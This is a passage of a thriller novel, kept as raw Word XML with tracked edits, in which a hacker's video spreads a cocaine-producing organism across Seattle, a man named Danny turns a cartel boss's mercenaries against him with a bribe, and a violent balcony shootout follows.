        <w:r w:rsidRPr="000D3488" w:rsidDel="00FC06D2">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-shirted young man sitting in a dark room. His face was hidden behind a pale mask bearing the smug countenance of Guy Fawkes, the subversive mascot of the Anonymous hacker collective.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check this crazy shit,” he said from behind the mustachioed mask. His energetic voice sounded in its mid</w:t>
      </w:r>
      <w:ins w:id="2842" w:author="TextVet" w:date="2016-03-28T11:36:00Z">
        <w:r w:rsidR="00C82560">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2843" w:author="TextVet" w:date="2016-03-28T11:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C82560">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twenties. “There’s this dude I know from the Maker meetup group. Older dude. He DMed me this afternoon. He goes, ‘Let’s meet in private. There’s a message I need to get out.’ And at first I’m like, ‘Man, we’re not friends. We just see each other around. Stop being weird.’ But then he says, ‘I know you’re with Anonymous. This is relevant.’ So I’m like, alright, I’ll take a chance. I invite him down to my lair. Well, he and a girl show up like ten minutes later. And they bring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Fawkes-faced young man held up a goo-filled vial.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obviously I’m like, ‘What’s that?’ He says, ‘It’s the next logical step for hackers. Computers are overdone. This is hacking DNA.’ The girl walks me through how to grow it — like sea monkeys, kinda. So we whip up a batch, and he gives me a bunch of empty test tubes and says, ‘Spread this out to as many people as you can, and do it </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fast</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.’ And I’m like, ‘Why? What </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> this stuff?’ So, he says nothing</w:t>
      </w:r>
      <w:ins w:id="2844" w:author="TextVet" w:date="2016-03-28T11:39:00Z">
        <w:r w:rsidR="00856DEC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2845" w:author="TextVet" w:date="2016-03-28T11:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00856DEC">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he reaches into his bag, and he pulls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young man held up a cellophane-wrapped brick of white powder.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“Now, that, kids, is exactly what it looks like. I tried a bit. It’s a hundred percent the real deal. And this dude had like a dozen of them. That’s right, folks. This little tube of snot literally makes coke by the kilo. This is a straight-up game-changer, folks. You’re witnessing history in the making. This goop here turns the entire cocaine industry into a do-it-yourself project.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“So, I’m calling all my bros and sisters in the 206. Get your butts over here. This dude gave it to me</w:t>
      </w:r>
      <w:ins w:id="2846" w:author="TextVet" w:date="2016-03-28T11:39:00Z">
        <w:r w:rsidR="00E93B61">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2847" w:author="TextVet" w:date="2016-03-28T11:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E93B61">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now I’m gonna give it to you. And then tomorrow you guys give it to others. This shit’s about to — heh — go viral.”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Underneath the video, the comment section’s count was already into quadruple digits.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>me gusta!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>youcancallmegoddess 2 minutes ago</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
        <w:t>HOLY SHIT NEAT!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>wilcobox 3 minutes ago</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
        <w:t>Yo bro bring that shit to Philly stat!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>linkopteryx47 5 minutes ago</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
        <w:t>Guys, I'm a bioengineering PhD student @UCDavis and to everyone saying this is bullshit, it's absolutely possible with the right resources. Send me a sample, my advisor will bust a nut over this.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>monicapetrelli 6 minutes ago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it’s not just on YouTube,” said Danny. “It’s on Twitter, Craigslist, reddit, SMS. There’s a hundred cloned vials floating around the city by now. In two days, there’ll be a thousand. In a week, there’ll be hundreds of thousands across the country. You’ve created a living thing here, Ivan. And do you know what a living thing does, by definition? It multiplies.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“Isn’t this what you wanted, Ivan? You set out to create a technology that you could use to liberate yourself from Col</w:t>
      </w:r>
      <w:ins w:id="2848" w:author="TextVet" w:date="2016-03-28T11:40:00Z">
        <w:r w:rsidR="00DD1248">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2849" w:author="TextVet" w:date="2016-03-28T11:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DD1248">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>u</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mbian drug cartels. Well, guess what? Now that you’ve created it, that exact same technology can be used just as easily by anyone else to liberate themselves from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Ivan, the question is: What will this do to the market value of cocaine? Your single most profitable product? The only product that keeps your entire empire in the black? Well, you’re a businessman. You do the math.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truth is, Ivan, you should be proud of yourself. I truly mean that. Oh sure, financially, this might be an unmitigated disaster. But as a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>technologist</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, what you’ve done is what people like me </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dream</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of doing. You’ve changed the world. In fact, you’ve changed it so thoroughly that you no longer even have a place in it. You’ve pushed the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>world so far forward that it’s left you behind. You stand here now completely spent, having given to the world everything you have to offer. And now, all your talents, all your efforts, everything that has enabled you to achieve this triumph — all of it, specifically </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>because</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> you’ve achieved it, is now obsolete and useless.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you know what the real irony is? Finding yourself obsolete and useless? That’s </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> defeat. It’s the exact opposite: it’s how you know your mission’s been accomplished. It’s how you know you’ve achieved your goals. It isn’t a hallmark of failure; it’s the pinnacle of victory. When you’ve used yourself up… When you’ve rendered yourself pointless by your own hand… When you feel your knees buckle from fatigue and you collapse, exhausted and weak and old, onto the dusty path along which you’ve been pushing the world, and it rolls away from you, propelled forward by the momentum you had spent your life imparting to it, and you watch the world recede toward the horizon carrying the next generation onward to a future you’ve made possible and yet you will never see… …Then! </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Then</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> is when you can finally let your head drop down into the dirt with a smile on your lips, when you can finally rest; because </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>then</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> is when you know that you’ve succeeded.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Ivan? You’ve succeeded.”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On the television, a map of </w:t>
      </w:r>
      <w:del w:id="2850" w:author="TextVet" w:date="2016-03-28T11:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006170FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Seattle</w:t>
      </w:r>
      <w:ins w:id="2851" w:author="TextVet" w:date="2016-03-28T11:43:00Z">
        <w:r w:rsidR="006170FC">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 xml:space="preserve"> metropolis appeared. It was sprinkled with dozens of tiny pictures of the Eppendorf vial. The icons were packed into clusters in the University District, on Capitol Hill, in Belltown, in Pioneer Square — all high-density neighborhoods of young, technologically savvy urban professionals. A new vial icon popped onto the display in Fremont, then another on Beacon Hill. The map gradually zoomed out. Slowly, the icons began peppering West Seattle, then Lynnwood, then Burien, then Bellevue, then Redmond — and as everyone watched, the little Eppendorf vials spread ever outward.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suite’s overhead lights flicked back to life.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glared at Danny. “You will regret what you have done! If you thinking I would letting this… this crime against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“Ivan, this presentation you just saw… Do you think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were the target audience? None of this was for you.” Danny slowly swept his arm around the room to Ivan’s entourage. “It was for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mercenaries and prostitutes all looked back at Danny with expressions that spread across a wide spectrum, from contempt to curiosity to simply being impressed by his gall.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“What do you all think?” Danny </w:t>
      </w:r>
      <w:ins w:id="2852" w:author="TextVet" w:date="2016-03-28T16:19:00Z">
        <w:r w:rsidR="00FA4976">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>fishe</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2853" w:author="TextVet" w:date="2016-03-28T16:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FA4976">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 “Do you think this guy is going to be a stable employer for much longer? Do you think he’ll still be able to take you on private jets to luxury hotels around the world a month from now? Hook you up with corporate perks? Pay for your health insurance and a nice pension plan? If you ask me, your prospects with this guy don’t look promising.”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television flipped back to Ivan’s bank account.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have an alternate proposal for all of you,” Danny continued. “You see the balance shown on that screen? You guys bring Sergey’s daughter to me, unharmed. As soon as she and I are away from this hotel, my colleagues and I will take the money in this account and divide it up between each of you equally. We’ll transfer it to your own personal bank accounts directly, the moment she and I are at a safe distance. Count how many of you are in this room. Look at the numbers on the screen. Do the math.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as you consider my offer, bear something in mind. Each of you will </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> receive this money if both the girl and I walk out of here alive. If any one of you chooses to shoot me, you will not only be losing the cash for yourself; you will also be losing the cash for </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2854" w:author="TextVet" w:date="2016-03-28T16:21:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>every</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> one of your colleagues. Look around you. Decide whether or not that seems like a good idea.” Danny chose a soldier at random, looked him in the eye, and asked “What do you think?” He pivoted toward another and repeated, “What do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think?” He turned to face the lithe man holding the gun to him. “What about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man’s thin brows twitched into a furrow. He looked quizzically at Ivan.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yelled at him in Russian.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One of the other mercenaries in the room reluctantly spoke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Ivan erupted in a torrent of sharp words. He railed at the speaker and all the other men in the room. His nostrils flared</w:t>
      </w:r>
      <w:ins w:id="2855" w:author="TextVet" w:date="2016-03-28T16:22:00Z">
        <w:r w:rsidR="00F01046">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2856" w:author="TextVet" w:date="2016-03-28T16:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F01046">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spittle flew from his lips.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an instant, by an order from Ivan, a few of the men turned their guns away from Danny. They pointed them instead at the mercenary who had spoken out. Taken by surprise, the man raised his arms and said something quick and apologetic.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Another man came to the speaker’s defense. He said something to one of the bodyguards still loyal to Ivan. The two began to argue. They pointed their guns at one another.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more bickering, more tense discussion and hasty negotiation. More guns pivoted away from Danny and turned to bear down on each others’ wielders.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screamed hoarsely. He was ignored.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Outside, beyond the scuffle, the doors to the suite’s balcony hung open. There, in the moonlit darkness, a hint of motion caught Danny’s attention. A thin black nylon cord dropped onto the balcony floor from somewhere above, so silent and discreet that the arguing mercenaries failed to notice. The outline of a man’s helmeted head, suspended upside down, peeked surreptitiously from the top of the doorway.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figure hanging inverted above the balcony stretched an arm out toward the room. In its hand was a small silver snub-nose revolver.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low boom thundered through the suite, as though the room had been suddenly plunged into a thick ocean of liquid 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One of the men on the periphery of the standoff crumpled to the floor. A dark, viscous slurry of organic matter poured from his side. A corner of his rib cage was missing.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hanging upside down, swung his gun toward a second target.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Men and women dove for cover in all directions.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Three of the mercenaries opened fire toward the balcony, shaking the room with syncopated gunshots. Eugene pulled himself upward, out of the reach of their bullets. They rushed outside. With their guns pointed upward, they burst through the balcony doors — and there, they hesitated as their eyes adjusted to the darkness.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moment was all Eugene needed.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 swung his feet down and kicked a man in the head, then dropped in behind him while he was still reeling. Eugene’s hand made a quick jabbing motion at the mercenary’s neck. When the hand came away, Eugene’s butterfly knife protruded from the man’s throat. The mercenary gurgled and fell to his knees, pink foam frothing from his lips.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Before the other two soldiers could bring their guns to bear, two more shots rang out from Eugene’s revolver. One man collapsed to the balcony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remaining bodyguard managed to get a handful of rounds off from his handgun, striking Eugene in the abdomen and chest. Eugene stumbled backwards from the impacts. The hammer of the man’s gun clicked against an empty chamber. He took a step toward Eugene, expecting to see him fall limp.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Instead, he heard </w:t>
      </w:r>
      <w:del w:id="2857" w:author="TextVet" w:date="2016-03-28T16:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007C7E40">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the sound of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the bullets, flattened and deformed into squashed mushroom-like shapes, ding</w:t>
      </w:r>
      <w:ins w:id="2858" w:author="TextVet" w:date="2016-03-28T16:27:00Z">
        <w:r w:rsidR="007C7E40">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like coins against the balcony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glanced down for a moment at his body armor, taking stock of the dimples where the bullets had hit. Then his eyes rose back up to zero in on the remaining mercenary with a look of extreme displeasure.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00722BD0" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> blur of motion</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> preluded</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the man’s body careening over the railing, his screams falling away toward the </w:t>
      </w:r>
      <w:ins w:id="2859" w:author="TextVet" w:date="2016-03-28T16:30:00Z">
        <w:r w:rsidR="00E838D1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">skull-wrecking </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
